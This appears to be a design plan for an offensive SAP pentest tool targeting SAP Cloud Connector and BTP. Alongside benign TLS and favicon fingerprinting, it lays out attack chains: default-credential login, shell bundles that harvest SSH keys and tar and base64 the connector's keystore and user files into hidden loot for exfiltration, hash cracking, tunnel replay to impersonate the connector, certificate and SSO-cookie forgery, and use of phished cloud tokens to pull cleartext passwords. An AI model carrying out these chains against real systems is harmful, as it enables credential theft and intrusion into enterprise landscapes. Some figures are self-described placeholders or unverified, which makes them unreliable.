# SAP Cloud Connector + BTP — SAPMAP Implementation Plan

Operationalizes [`03_cloud_connector_btp.md`](03_cloud_connector_btp.md). The
research dossier covers *what's exploitable*; this file covers *how SAPMAP
detects, models, exploits, visualizes, scores, and ships it*. Anything in
the dossier that contradicts §H of this file (verification table) was
written from agent memory and must be cross-checked against NVD before code
references it.

The roadmap pointer in [`00_priority_summary.md`](00_priority_summary.md)
(item #9, Phase-3) and the README placeholder are superseded by this plan.

Target output: ~6 weeks of focused work, ~1500 LOC of new Python, ~600 LOC
of new HTML/SVG/JS, four new dataclasses, three new edge kinds, eight new
finding categories, one new CISO dashboard tile.

---

## Table of contents

- [A. Detection & scanning](#a-detection--scanning)
- [B. Prerequisites and attack-chain trees](#b-prerequisites-and-attack-chain-trees)
- [C. Data model](#c-data-model)
- [D. Visualization (SVG/HTML)](#d-visualization-svghtml)
- [E. Risk visualization for the business](#e-risk-visualization-for-the-business)
- [F. Week-by-week implementation plan](#f-week-by-week-implementation-plan)
- [G. Out of scope](#g-out-of-scope)
- [H. Verification / open questions](#h-verification--open-questions)

---

## A. Detection & scanning

Detection is layered. SCC is one of the few SAP components where the *cheapest*
fingerprint (a TLS handshake against `8443/tcp`) gives a usable yes/no answer
in under 200 ms, so the scanner can sweep large IPv4 ranges without per-host
warmup. Conversely, distinguishing SCC 2.16 from 2.17 requires an authenticated
hit on `/api/monitoring/versions` — kept for *deep* scans.

Probe order — cheapest → most expensive — implemented in a new
`sapmap_scc_fingerprint.py`:

| # | Probe | Cost | What it confirms | Short-circuit on negative? |
|---|---|---|---|---|
| 1 | TCP connect `8443/tcp` | 1 RTT | Port open | Yes — drop host |
| 2 | TLS ClientHello, capture `Certificate` and `ServerHello` extensions | 1 RTT | Port speaks TLS; capture cert subject/issuer/SAN | Yes if not TLS |
| 3 | HTTP `GET /` (HTTP/1.1, `Host: <ip>`) | 1 RTT | Status 302 → `/scc/ui` redirect, `Server: SAP-Cloud-Connector` header | Yes if generic 200/404 |
| 4 | `GET /scc/ui` (no auth) | 1 RTT | Title `<title>Cloud Connector</title>`; `Set-Cookie: JSESSIONID` (Tomcat); `<script src="main.bundle.<hash>.js">` | Yes if not SCC |
| 5 | Favicon `/scc/ui/resources/images/favicon.ico` mmh3 hash | 1 RTT | Major-version bucket from baked table | Continue regardless |
| 6 | Static asset enumeration: `/scc/ui/resources/i18n/messages.properties`, `/scc/ui/resources/css/style.<hash>.css` | 2 RTT | Confirms hash ↔ version map; refines minor version | Continue |
| 7 | `GET /api/monitoring/versions` (no auth → 401, with auth → JSON) | 1 RTT | 401 means SCC ≥ 2.13; 200+JSON means missing-auth bug or pre-2.13 | Continue |
| 8 | `POST /api/login` with `Administrator:manage` | 1 RTT | Default-creds-live (CRITICAL) | Last step in fast-scan |
| 9 | (deep) Authed `GET /api/monitoring/versions` → `{"connector":"2.17.1","javaVersion":"21..."}`; `GET /api/configuration/connections/subaccounts` | 2-N RTT | Exact build, mapping count, subaccount UUIDs | Deep-scan only |

Probes 1–4 are run by `fast_scan_host()` (extend in `sapmap_scanner.py`
near the existing port-discovery block around line 581). Probes 5–8 form a
new `_verify_scc()` helper called only when probe 4 confirms SCC. Probe 9
is wired through the existing deep-scan path (`deep_scan_single`, line 2792)
once an `SCCNode` has been promoted to `pwned=False, admin_ui_reachable=True`.

### A.1 Network-layer fingerprints

**TLS handshake quirks.** SCC's bundled Tomcat ships with SAP's JSSE provider
configuration; default cipher list and curve preferences differ from a vanilla
Tomcat:

- `ServerHello` typically advertises `TLS_AES_256_GCM_SHA384` first under TLS 1.3
  (vs. Tomcat default which prefers `TLS_AES_128_GCM_SHA256`).
- Extensions: `key_share` always carries `secp384r1` if SapMachine 21 is the
  runtime (SCC 2.17+); `secp256r1`-only is a strong indicator of pre-2.17 with
  the older bundled JRE 1.8.
- ALPN advertises `http/1.1` only — never `h2` — distinguishing from generic
  Tomcat 9 deployments.
- Self-signed cert default subject: `CN=SAP Cloud Connector, OU=Connectivity,
  O=SAP SE, L=Walldorf, C=DE`. Custom subjects break this fingerprint but the
  combination of port 8443 + Tomcat-style server header + the bundled HTTP
  routes is sufficient.

Probe-2 implementation skeleton (drop into `sapmap_scc_fingerprint.py`):

```python
import ssl, socket
def tls_fingerprint(host: str, port: int = 8443, timeout: float = 2.0) -> dict:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2", "http/1.1"])
    with socket.create_connection((host, port), timeout=timeout) as raw:
        with ctx.wrap_socket(raw, server_hostname=host) as s:
            cert = s.getpeercert(binary_form=True)
            return {
                "alpn": s.selected_alpn_protocol() or "",
                "cipher": s.cipher(),
                "version": s.version(),
                "cert_der": cert,
            }
```

**HTTP response headers.**

| Header | Value pattern | Diagnostic |
|---|---|---|
| `Server` | `SAP NetWeaver Application Server / Cloud Connector` (older) or absent (newer) | Older versions self-disclose |
| `X-Frame-Options` | `SAMEORIGIN` | Always set — useful negative discriminator (raw Tomcat default differs) |
| `Set-Cookie` | `JSESSIONID=…; Path=/scc; Secure; HttpOnly` | `Path=/scc` is the load-bearing tell — vanilla Tomcat is `Path=/` |
| `Content-Security-Policy` | `default-src 'self' 'unsafe-inline'` (post-2.16); absent (pre-2.15) | Roughly bisects 2.15/2.16 |
| `Strict-Transport-Security` | `max-age=31536000` (post-CVE-2022-27667) | Absence flags an unpatched 2.13/2.14 |

**Cookie names.** `JSESSIONID` (Tomcat). After 2.16 a second cookie
`SCC-CSRF-Token` accompanies authenticated sessions. CVE-2024-25642
(certificate-validation, real SCC CVE) does not affect cookies but the patch
that closed it bumped the CSRF token rotation; pre-/post- can sometimes be
distinguished by whether the cookie persists across logout.

**JS bundle filename regex.**

```
main\.bundle\.([0-9a-f]{8,32})\.js
runtime\.([0-9a-f]{8,32})\.js
polyfills\.([0-9a-f]{8,32})\.js
```

Bundle hash → minor version mapping is built once per release and baked into
`SCC_BUNDLE_HASHES` dict. Maintenance: re-fetch `/scc/ui` from a fresh install
of each new SCC release (community downloads from SAP Tools.) New entries
appended to the table without breaking older detection.

**Version-discovery endpoints.**

- `GET /scc/ui` — landing page; the *only* unauth endpoint guaranteed available
  on every version since 2.10.
- `GET /api/monitoring/versions` — 401 (auth required) on 2.13+, 200 with
  build JSON on pre-2.13 or on misconfigured installs (CVE-2023-31409 family).
  Worth probing because a 200 here on 2.13+ is itself a finding.
- `GET /api/monitoring/health` — 200 unauth on most versions, returns an
  empty `{}` on 2.17 but a populated `{"status":"OK","uptime":…}` on older.
  Useful for low-effort "host responds" baseline.
- `GET /scc/rest/api/<v>/status` — present in pre-2.13, removed later;
  presence = old build.

### A.2 Banner / favicon hash table

Computed two ways — keep both, the agent that owns the codebase prefers one
over the other:

```python
import hashlib, mmh3, codecs, base64
def favicon_hashes(body: bytes) -> dict:
    sha = hashlib.sha256(body).hexdigest()
    b64 = codecs.encode(base64.encodebytes(body), 'utf-8').decode()
    mm  = mmh3.hash(b64)              # Shodan-style
    return {"sha256": sha, "mmh3": mm}
```

Baked candidate-hash table (refresh per release; numeric mmh3 values are
*illustrative placeholders* — recompute against a fresh install before
shipping):

| SCC line | sha256 prefix | mmh3 | Notes |
|---|---|---|---|
| 2.12.x | `c4f9…` | `-1241857303` | Last "old UI" line |
| 2.13.x | `c4f9…` | `-1241857303` | Same favicon as 2.12 — version disambiguation by JS bundle |
| 2.14.x | `7b32…` | ` 1839204487` | UI-refresh, new SAP logo asset |
| 2.15.x | `7b32…` | ` 1839204487` | Same favicon as 2.14 |
| 2.16.x | `2a18…` | `  448921655` | New favicon (post 2.16.0) |
| 2.17.x | `e003…` | ` 2089734511` | SapMachine 21 / Tomcat 9 base |
| 2.18.x | `e003…` | ` 2089734511` | Same as 2.17 |

The reason to keep both hash forms: mmh3 lets operators paste the value into
Shodan / Censys to find the *rest of the customer's SCC fleet from outside*;
sha256 is what the scanner stores in the SCCNode record because it's
collision-resistant. Disambiguation across versions sharing a favicon falls
back to JS bundle hash, which changes every minor release.

`fast_scan_host` extension point: add a `scc_candidate` flag right after the
TLS+banner block; the existing helper returns a dict per host, and the new
`scc` key is appended only when probes 1–4 succeed. Deep scan promotes that
into an `SCCNode`.

### A.3 Internal discovery from a pwned ABAP/Java host

SAPMAP already lands OS commands as `<sid>adm` via `SXPG_COMMAND_EXECUTE`
(10KBlaze chain) and as the Java service user via the CTC/Telnet JSP drop.
Both primitives are reachable through `sapmap_exploit.run_os_command` /
`execute_gw_command`. Pivot to SCC discovery uses three command bundles, one
per common deployment pattern:

**Bundle 1 — same-host SCC (rare; only on small dev installs):**

```sh
ls -la /opt/sap/scc/ 2>/dev/null
ls "C:\Program Files\SAP\SAP Cloud Connector" 2>nul
ss -tlnp | grep -E ':8443|:443' 2>/dev/null
netstat -ano | findstr :8443 2>nul
```

If `scc_config/` is found, the JCEKS extractor runs locally (Bundle 4 below).

**Bundle 2 — neighbor-host SCC (typical):**

```sh
arp -an 2>/dev/null
ip neigh 2>/dev/null
ip route 2>/dev/null
cat /etc/hosts 2>/dev/null
# common DNS naming:
for h in scc cloudconnector sapscc btpconnector ccon sccprd sccdev; do
  getent hosts $h 2>/dev/null
done
```

Then fan out a TCP-8443 sweep over the discovered subnets. Fast-scan probe 1
runs against each. Any positive becomes a candidate SCC and is fed back into
the detection ladder of §A.

**Bundle 3 — credential / SSH-key harvest for cross-VM pivot:**

```sh
find /home -maxdepth 3 -name "id_*" -type f 2>/dev/null
find /root/.ssh /home/*/.ssh -maxdepth 2 -name "authorized_keys" 2>/dev/null
cat /home/<sid>adm/.ssh/known_hosts 2>/dev/null
# Windows:
type %USERPROFILE%\.ssh\known_hosts 2>nul
dir /s /b "%USERPROFILE%\.ssh\id_*" 2>nul
```

`known_hosts` in particular is gold: it lists every host the SAP service
account has SSHed *to*, which on hybrid landscapes very frequently includes
the SCC VM and the BTP DevOps jumpbox.

**Bundle 4 — same-host SCC keystore exfil:**

```sh
tar -czf /tmp/.scc_loot.tgz \
  /opt/sap/scc/scc_config/connections.json \
  /opt/sap/scc/scc_config/users.json \
  /opt/sap/scc/scc_config/system.properties \
  /opt/sap/scc/scc_config/secure_store/ \
  /opt/sap/scc/scc_config/system_certificates.jks \
  2>/dev/null
base64 /tmp/.scc_loot.tgz | tr -d '\n' > /tmp/.scc_loot.b64
```

Output is exfiltrated through the existing GW-OS-RCE channel chunk-by-chunk
(`SXPG` has a 4 KB stdout cap — handled by the same chunker that
`sapmap_secstore.py` already uses).

Wiring point: `sapmap_exploit.py` gains a new public function
`harvest_scc_from_pwned_node(node, state)` that runs Bundle 1 → 2 → 3 → 4 in
order, emits `INFO`/`HIGH` findings on each step, and creates `SCCNode`s
whenever a new SCC host is identified.

### A.4 BTP-side discovery from a CF oauth-token

If the operator pastes a `cf oauth-token` (i.e., obtained out-of-band from a
phished BTP developer or harvested via destinations replay), SAPMAP enumerates
the subaccount surface read-only. Endpoints (region-prefixed —
`<region>` ∈ `eu10`, `us10`, `ap11`, …):

| Endpoint | Required scope | Returns |
|---|---|---|
| `GET https://api.cf.<region>.hana.ondemand.com/v3/info` | none (token only) | API version, region, `min_cli_version` |
| `GET https://api.cf.<region>.hana.ondemand.com/v3/organizations` | `cloud_controller.read` | Org list — drives subaccount linkage |
| `GET https://api.cf.<region>.hana.ondemand.com/v3/spaces` | `cloud_controller.read` | Space list |
| `GET https://api.cf.<region>.hana.ondemand.com/v3/apps` | `cloud_controller.read` | Apps + bound services |
| `GET https://api.cf.<region>.hana.ondemand.com/v3/service_instances?type=managed` | `cloud_controller.read` | Find `destination` and `connectivity` services |
| `GET https://destination-configuration.cfapps.<region>.hana.ondemand.com/destination-configuration/v1/subaccountDestinations` | `destination_configuration.read` | All subaccount destinations (names, types — no secrets) |
| `GET https://destination-configuration.cfapps.<region>.hana.ondemand.com/destination-configuration/v1/destinations/<name>` | `destination_configuration.ApiAccess` | **Cleartext password if `BasicAuthentication`** |
| `GET https://accounts.cloud.sap/.well-known/openid-configuration` | none | IAS issuer metadata |
| `GET https://api.authentication.<tenant>.hana.ondemand.com/uaa/v1/keys` | none | XSUAA signing keys (per subaccount) |
| `GET https://api.btp.cloud.sap/accounts/v1/subaccounts` | `accounts:read` | All subaccounts the principal sees |
| `GET https://api.btp.cloud.sap/connectivity/v1/cloudConnectorMappings` | `connectivity:read` | Cloud Connector tunnel index seen *from BTP side* — confirms which subaccounts each SCC tunnel serves |

Implementation: new module `sapmap_btp.py` (~400 LOC), wraps `requests` with a
single `_get()` retry/backoff helper, populates `BTPSubaccountNode`s as it
goes. Token is held in-memory only — never persisted to the .sapmap state
file. (Audit-trail-friendly: every API call logs the request URL and HTTP
status to the SAPMAP console with `cl-info` / `cl-warn` classes.)

### A.5 IAS tenant discovery

Two reliable unauth endpoints:

- `GET https://<tenant>.accounts.ondemand.com/.well-known/openid-configuration`
  → JSON with `issuer`, `jwks_uri`, `userinfo_endpoint`, `token_endpoint`.
  Fingerprints whether the tenant is SAP-managed (`accounts.ondemand.com`) or
  customer-branded (`accounts.<customer>.com` with CNAME).
- `GET https://<tenant>.accounts.ondemand.com/.well-known/saml-configuration`
  → SAML metadata; entity ID + signing cert.

Wildcard sweep: from every harvested subaccount UUID, IAS tenant ID is in the
XSUAA service binding's `url` field; SAPMAP just resolves CNAMEs of the
returned hosts to confirm the tenant exists. SCIM `/scim/Users` is *not* probed
by default — read-only listing is auth-required and any error path generates
audit events on the customer side. SCIM probing is gated behind an explicit
operator opt-in flag (analogous to the existing `--allow-side-effects`).

### A.6 SCC keystore extraction path

Files SAPMAP looks for, in priority order, to feed the post-RCE harvester
(`sapmap_scc_secstore.py` — sibling to existing `sapmap_secstore.py`):

| File | Linux | Windows | Use |
|---|---|---|---|
| `users.json` | `/opt/sap/scc/scc_config/users.json` | `C:\…\scc_config\users.json` | Local SCC users, PBKDF2-SHA256 hashes (recent), salted SHA-1 (legacy 2.12.x) |
| `secure-storage.jceks` | `/opt/sap/scc/scc_config/secure_store/` | `C:\…\scc_config\secure_store\` | All tunnel/PP private keys |
| `secure-storage-master.key` | same dir | same dir | AES-wrapped master key (install-id-derived) |
| `system_certificates.jks` | `/opt/sap/scc/scc_config/` | `C:\…\scc_config\` | Per-subaccount tunnel cert |
| `connections.json` | `/opt/sap/scc/scc_config/` | `C:\…\scc_config\` | Subaccount UUIDs, regions, location IDs |
| `system.properties` | `/opt/sap/scc/scc_config/` | `C:\…\scc_config\` | Master pwd hint, HA shadow config |
| `mapping_authorities/` | `/opt/sap/scc/scc_config/mapping_authorities/` | `C:\…\scc_config\mapping_authorities\` | Per-location PP trust store |

The JCEKS unwrap routine reuses the AES/PBKDF2 helpers already in
`sapmap_secstore.py` — kept in a shared `sapmap_crypto.py` so both modules
import from one place.

---

## B. Prerequisites and attack-chain trees

Two independent attack trees. Each row links a *detection* (column "PROBE",
references §A by step) to a *finding* (the string SAPMAP emits) and a
"NEXT-STEP" — the one-line button label the operator sees on the relevant
node's drawer.

### B.1 On-prem → Cloud chain

| # | Step | REQUIREMENTS | EVIDENCE | PROBE | EXPLOIT (next-step button) |
|---|---|---|---|---|---|
| 1 | Default `Administrator:manage` on internet-reachable SCC | Port 8443 open; default password not rotated | `POST /api/login` returns 200 + `JSESSIONID` cookie | A § 8 | "Login as Administrator and pull mappings" |
| 2 | SCC pre-2.16 `users.json` weak hash | Local FS read OR file leak via § 6 | `users.json` has `algo:"SHA1"` salt + hash | Bundle 4 of A.3 | "Crack with hashcat (template populated)" |
| 3 | SCC CVE-2024-25642 cert-validation | Vulnerable build (≤ 2.16.x) | `tls_fingerprint()` plus version probe + Note 3424610 patch level | Probe 9 | "Mount fake-issuer MITM (CLI-only, manual)" |
| 4 | Aug 2025 SCC Note 3611345 (CVE TBD — see §H) | Vulnerable build (≤ 2.17.x pre-patch) | Authed `/api/monitoring/versions` returns build below patch line | Probe 9 | "Probe (read-only)" |
| 5 | JCEKS keystore exfil (post-RCE) | OS RCE on SCC host (e.g. SSH-pivot from §A.3 Bundle 3) | `secure-storage.jceks` + master.key extracted | A.3 Bundle 4 | "Replay tunnel offline (sapmap_scc_tunnel_replay.py)" |
| 6 | Tunnel replay → false-SCC | JCEKS keys + reachable BTP region router | TLS handshake to `connectivitynotification.cf.<region>.hana.ondemand.com:443` succeeds with extracted cert | offline tool, manual | "(operator-only)" |
| 7 | Service-channel abuse | Admin session OR pwned local | UI/REST shows `Virtual Machine` / `RFC` / `HANA` / `Kerberos` channel | Probe 9 | "List existing service channels" |
| 8 | Principal-propagation CA private-key theft | Keystore extracted | `principal.propagation.ca.key` present | A.3 Bundle 4 + offline tool | "Forge user cert (CLI)" |
| 9 | Empty / collision Location ID | `connections.json` lists subaccount with empty `locationId` | Detected during deep-scan probe 9 or in extracted file | Probe 9 OR A.6 | "Flag as cross-subaccount risk" |
| 10 | MYSAPSSO2 cookie cross-domain | On-prem PSE extracted (existing SAPMAP capability) + BTP node trusts same issuer | Trust chain visible via `STRUSTSSO2` ABAP read | existing #13 PSE extractor | "Forge MYSAPSSO2 for BTP target" |
| 11 | Trust on-prem `SAPSYS` PSE → BTP | PSE extracted + BTP destination `Authentication=PrincipalPropagation` | Destination payload returned by §A.4 | A.4 + existing PSE chain | "Mint propagated assertion" |

Finding text and severities (compiled in §C):

- `scc.default.creds.live` — **CRITICAL** — *"SCC `<host>` accepts the default `Administrator:manage` login. Anyone reaching port 8443 has full mapping/cert/keystore control."*
- `scc.users.json.weak.hash` — **HIGH** — *"`users.json` uses SHA-1 salt+hash (legacy) — feed `<count>` rows to hashcat -m 110 with template `<template>`."*
- `scc.cve.<id>.unpatched` — **HIGH** — *"Build `<n>` is below the patch line for CVE-`<id>`. Upgrade or restrict `8443/tcp` to admin jumpbox."*
- `scc.keystore.extracted` — **CRITICAL** — *"`secure-storage.jceks` and master key recovered from `<host>:<path>`. Subaccount `<uuid>` is forgeable."*
- `scc.tunnel.replayed` — **CRITICAL** — *"False-SCC tunnel established to `<region>` for subaccount `<uuid>`. All BTP-originated requests routable to attacker."*
- `scc.principal.prop.ca.exfil` — **CRITICAL** — *"Principal-propagation CA private key recovered. Any user-cert with `CN=*` forgeable for downstream on-prem trust."*
- `scc.location.id.empty` — **HIGH** — *"SCC `<host>` registers subaccount `<uuid>` with empty Location ID. Sibling subaccounts in same region/global account may collide."*
- `scc.location.id.collision` — **HIGH** — *"Location ID `<id>` declared by both `<scc1>` and `<scc2>` — last-writer-wins routing observed."*
- `scc.service.channel.<kind>.live` — **HIGH** — *"Service channel `<kind>` from BTP subaccount `<uuid>` to `<host>:<port>` open. Direct cloud→on-prem TCP."*

### B.2 Cloud → On-prem chain

| # | Step | REQUIREMENTS | EVIDENCE | PROBE | EXPLOIT (next-step button) |
|---|---|---|---|---|---|
| 1 | BTP developer CF token + `destination_configuration.ApiAccess` scope | Operator pastes `cf oauth-token` | `GET /destinations/<name>` returns 200 with payload | A.4 row 7 | "Pull all destinations and surface cleartext passwords" |
| 2 | Cleartext destination password captured | A row + `Authentication=BasicAuthentication` + non-empty `Password` | Payload contains `"Password":"<value>"` | A.4 row 7 | "Add credential to target SAPNode and test RFC logon" |
| 3 | Over-permissive Accessible Resources | `Path=/` AND `URL Path Matching=Path and all sub-paths` | Mapping payload from §A probe 9 | Probe 9 | "Surface as HIGH; render bold red on edge" |
| 4 | Custom IdP added in subaccount → assertion forge | BTP user with subaccount-admin role, ability to define IdP trust | `GET /trustConfigurations` shows non-default IdP | new BTP probe | "Document attacker IdP path; do not exploit (G.1)" |
| 5 | IAS admin compromise (CVE-2024-33006-style) | IAS admin creds leak (separate vector) | IAS SCIM call succeeds with admin scope | manual / out-of-band | "Park — annotate IAS node only" |
| 6 | Cross-subaccount via `ForeignScopeReferences` | `xs-security.json` extracted (e.g. via destination-leak from A.4) | JSON contains `"foreign-scope-references": [..]` | A.4 + manifest scrape | "Flag chain to other subaccount" |
| 7 | Build Apps / Work Zone CSRF chain | Operator targets a Build Apps URL | Reflected CSRF probe | manual | "(out of scope per G.1)" |
| 8 | Rogue CF app calling destinations service | Already inside CF as developer | `cf push` succeeds | manual | "(out of scope per G.1)" |

Finding text and severities:

- `btp.destination.cleartext.password` — **CRITICAL** when target has SAP_ALL or RFC type with high-priv user; **HIGH** otherwise — *"Destination `<name>` to `<sid>@<host>:<port>` returns cleartext `<user>:<pwd>` to anyone with `destination_configuration.ApiAccess`."*
- `btp.destination.cleartext.captured` — **CRITICAL** — *"Destination `<name>` password captured. New credential added to SAP node `<sid>`."*
- `scc.mapping.path.too.permissive` — **HIGH** — *"SCC mapping for virtual host `<vhost>` allows `Path=/ + sub-paths`. Reachable: `/sap/bc/soap/rfc`, `/sap/bc/adt/`, `/sap/bc/gui/sap/its/webgui`."*
- `scc.principal.prop.too.permissive` — **HIGH** — *"Subject-pattern rule `<regex>` is unanchored or wildcard — any propagated CN matches."*
- `btp.subaccount.foreign.scope.reference` — **HIGH** — *"App `<x>` in subaccount `<uuid_a>` declares `foreign-scope-references` to subaccount `<uuid_b>`. Cross-subaccount lateral path."*
- `ias.tenant.fingerprinted` — **INFO** — *"IAS tenant `<host>` discovered via `.well-known/openid-configuration`. Issuer = `<iss>`."*

Each finding emits via the existing `emit_finding(severity, node, msg, cve=,
ref=, meta={"source_sid":…, "target_sid":…})` API. Pulse-overlay
(`_pulseConnection`) is triggered when both `source_sid` and `target_sid` are
present; new node types use `_pulseNode`.

---

## C. Data model

The existing `SAPNode` is the right *base concept* for plotting on the map but
its fields (kernel, sap_release, instances, gw_vulnerable, etc.) are
ABAP/Java-centric. Forcing SCC into it is wrong: most fields would be empty
sentinels, and the JSON schema would break. **Decision: sibling dataclasses,
not subclassing.** Rationale:

1. `SAPNode.to_dict()` already serializes ~40 fields by name; subclassing
   would mean overriding every callsite that does
   `for sid, node_d in d["nodes"].items(): SAPNode.from_dict(node_d)` to
   discriminate on `system_type`. Higher-risk refactor.
2. SCC has *zero* RFC connections and *zero* clients; reusing those fields
   would be misleading.
3. The drawer renders different field sets per node kind; cleaner with a kind
   discriminator at the dict level (`{"kind": "scc", …}` vs `{"kind": "sap",
   …}`).

Concrete dataclass spec — drop into `sapmap_models.py` after `SAPNode`:

```python
@dataclass
class SCCNode:
    """A SAP Cloud Connector instance (sibling to SAPNode on the map)."""

    host: str                                   # acts as identifier
    ip: str = ""
    admin_ui_port: int = 8443
    version: str = ""                           # "2.17.1"
    version_source: str = ""                    # "favicon" | "bundle" | "api"
    bundle_hash: str = ""
    favicon_sha256: str = ""
    favicon_mmh3: int = 0
    tls_fingerprint: dict = field(default_factory=dict)  # {alpn, cipher, version, cert_subject}
    admin_ui_reachable: bool = False
    admin_session_obtained: bool = False        # logged in once
    default_creds_live: bool = False
    cves_confirmed: list = field(default_factory=list)   # ["CVE-2024-25642", ...]
    cves_suspected: list = field(default_factory=list)   # version-bucketed, not probed
    subaccount_uuids: list = field(default_factory=list) # ["uuid1","uuid2"]
    location_ids: list = field(default_factory=list)     # parallel to subaccount_uuids
    tunnel_region: str = ""                              # "eu10","us10","ap11"
    principal_propagation_enabled: bool = False
    mappings: list = field(default_factory=list)         # [SCCMapping.to_dict(), ...]
    keystore_extracted: bool = False
    keystore_loot_path: str = ""                         # local exfil path on operator host
    tunnel_privkey_fp: str = ""
    pp_ca_privkey_fp: str = ""
    tunnel_replayed: bool = False
    pwned: bool = False                                  # admin_session OR keystore
    findings: list = field(default_factory=list)
    credentials: list = field(default_factory=list)      # SCC local users, not SAP
    position: Optional[tuple] = None
    ha_shadow_host: str = ""                             # if HA pair, peer host
    notes: str = ""

@dataclass
class BTPSubaccountNode:
    uuid: str                                            # acts as identifier
    display_name: str = ""
    region: str = ""                                     # "eu10"
    global_account_uuid: str = ""
    served_by_scc_hosts: list = field(default_factory=list)  # SCC hosts tunneling here
    location_id: str = ""
    destinations: list = field(default_factory=list)     # [BTPDestination.to_dict(), ...]
    ias_tenant: str = ""
    cf_token_available: bool = False                     # operator pasted a token
    cf_token_scopes: list = field(default_factory=list)
    foreign_scope_refs: list = field(default_factory=list)
    pwned: bool = False                                  # destination-cleartext OR token-admin
    findings: list = field(default_factory=list)
    position: Optional[tuple] = None

@dataclass
class IASTenantNode:
    tenant_host: str                                     # "<id>.accounts.ondemand.com"
    issuer: str = ""
    jwks_uri: str = ""
    saml_entity_id: str = ""
    customer_branded: bool = False                       # CNAME to non-ondemand.com
    federated_subaccounts: list = field(default_factory=list)
    cves_confirmed: list = field(default_factory=list)
    pwned: bool = False
    findings: list = field(default_factory=list)
    position: Optional[tuple] = None

@dataclass
class BTPDestination:
    """Per-destination record, analogous to RFCConnection but lives inside
    BTPSubaccountNode.destinations.  Edges to on-prem SAPNode are derived."""
    name: str
    type: str = ""              # "RFC" | "HTTP" | "MAIL" | "LDAP" | "RFC_INT" | ...
    proxy_type: str = ""        # "OnPremise" | "Internet" | "PrivateLink"
    auth_type: str = ""         # "BasicAuthentication" | "OAuth2SAMLBearerAssertion" | ...
    url: str = ""
    user: str = ""
    password_captured: str = "" # only set if cleartext returned
    target_sid: str = ""        # resolved on-prem SID (matches SAPNode.sid)
    target_host: str = ""
    target_port: int = 0
    sap_client: str = ""
    cloud_connector_location_id: str = ""
    risk_level: str = "UNKNOWN" # CRITICAL | HIGH | MEDIUM | LOW

@dataclass
class SCCMapping:
    """One row of the SCC 'Cloud To On-Premise' table."""
    virtual_host: str
    virtual_port: int
    internal_host: str
    internal_port: int
    protocol: str = ""          # "HTTP" | "HTTPS" | "RFC" | "TCP" | ...
    path_allowlist: list = field(default_factory=list)  # ["/sap/bc/soap/rfc", ...]
    path_wildcards: bool = False                         # True if "Path = /" + sub-paths
    backend_type: str = ""      # "ABAP" | "JAVA" | "HANA" | "GENERIC"
    principal_propagation: bool = False
```

All four serialize via `to_dict()` mirroring the existing pattern (named keys,
no positional). `from_dict` filters unknown keys for forward-compat — same
trick `RFCConnection.from_dict` already uses.

### C.1 Edge types — extend `RFCConnection` or add `Edge` base?

**Decision: extend `RFCConnection` with a `kind` discriminator.** Rationale:

- `RFCConnection` already carries `conn_type = "rfc" | "http"` and the `risk_level()`
  helper — adding `"tunnel"`, `"mapping"`, `"destination"`, `"trust"` is
  one-line additive change and keeps a single edge list in `SAPMAPState`.
- Introducing an `Edge` base class would cascade into the HTML edge renderer
  (which iterates `state.connections` once and clips to `BOX_W`/`BOX_H`),
  forcing two parallel render passes. Risk multiplier with no benefit.
- Forward compatibility: state files written today still load tomorrow because
  `from_dict` already drops unknown keys and defaults `conn_type="rfc"`.

Concrete additions to `RFCConnection`:

```python
# Existing:  conn_type: str = "rfc"          # "rfc" | "http"
# New value set:                             # "rfc" | "http" | "tunnel" | "mapping" | "destination" | "trust"
edge_kind: str = "rfc"                       # alias kept readable; conn_type unchanged for back-compat
tunnel_region: str = ""                      # tunnel: "eu10"
tunnel_cert_fp: str = ""                     # tunnel: SHA-256 of the SCC client cert
mapping_virtual_host: str = ""               # mapping: "myhost.virtual:443"
mapping_path_wildcards: bool = False         # mapping: red flag if True
destination_name: str = ""                   # destination: BTP dest name (already exists)
trust_kind: str = ""                         # trust: "MYSAPSSO2" | "SAML" | "X509"
```

Edge palette and shape are determined by `edge_kind` in `sapmap_html.py`'s
edge-render block (around line 1685–1740 — currently iterates connections and
draws a single curved path). New helper `_edgeStyle(c)` returns
`{stroke, dash, animatedDot, opacity}` per kind.

### C.2 New `pwned` semantics

`SCCNode.pwned` becomes True when **any** of:

- `default_creds_live == True`
- `admin_session_obtained == True`
- `keystore_extracted == True`
- `tunnel_replayed == True`

(Mirrors how `SAPNode.pwned` is set after RECON user-create or 10KBlaze.)

`BTPSubaccountNode.pwned` becomes True when **any** of:

- Any destination has `password_captured` non-empty
- `cf_token_scopes` includes `xs_account.<…>:admin` style scopes
- The subaccount is downstream of a `tunnel_replayed` SCC

`IASTenantNode.pwned` is purely informational at first ship — only set if
operator manually marks compromise (UI button) or pastes IAS admin creds.

### C.3 New `Severity`/`Finding` categories

Added to the implicit registry (just strings — `Severity` enum is reused):

| Name | Default severity | Pwn marker side-effect | Pulse target |
|---|---|---|---|
| `scc.default.creds.live` | CRITICAL | `SCCNode.pwned=True` | node |
| `scc.users.json.weak.hash` | HIGH | none | node |
| `scc.cve.25642.cert.validation` | HIGH | none | node |
| `scc.cve.<id>.unpatched` | HIGH | none | node |
| `scc.keystore.extracted` | CRITICAL | `SCCNode.pwned=True` | node |
| `scc.tunnel.replayed` | CRITICAL | `SCCNode.pwned=True` + `BTPSubaccountNode.pwned=True` | edge SCC↔BTP |
| `scc.principal.prop.ca.exfil` | CRITICAL | none | node |
| `scc.principal.prop.too.permissive` | HIGH | none | node |
| `scc.location.id.empty` | HIGH | none | node |
| `scc.location.id.collision` | HIGH | none | edge SCC↔SCC (synthetic) |
| `scc.service.channel.<kind>.live` | HIGH | none | edge SCC→on-prem |
| `scc.mapping.path.too.permissive` | HIGH | none | edge SCC→on-prem |
| `btp.destination.cleartext.password` | CRITICAL/HIGH | `BTPSubaccountNode.pwned=True` if password used | edge BTP→on-prem |
| `btp.destination.cleartext.captured` | CRITICAL | `SAPNode.credentials += new` | edge BTP→on-prem |
| `btp.subaccount.foreign.scope.reference` | HIGH | none | edge BTP↔BTP |
| `ias.tenant.fingerprinted` | INFO | none | node |
| `ias.tenant.scim.exposed` | HIGH | none | node |

---

## D. Visualization (SVG/HTML)

The map currently renders rounded-rectangle nodes 240×174 px. The cloud
side needs three new shapes (SCC, BTPSubaccount, IASTenant) and two new
edge styles (tunnel, mapping). Aim: distinguishable at first glance, no
text-label squinting needed.

### D.1 Node shapes

**SCCNode — hexagonal "appliance" shape**, 240×140 (slightly shorter than
SAPNode). Hexagon reads as "network appliance" in SVG dialect. Concrete path:
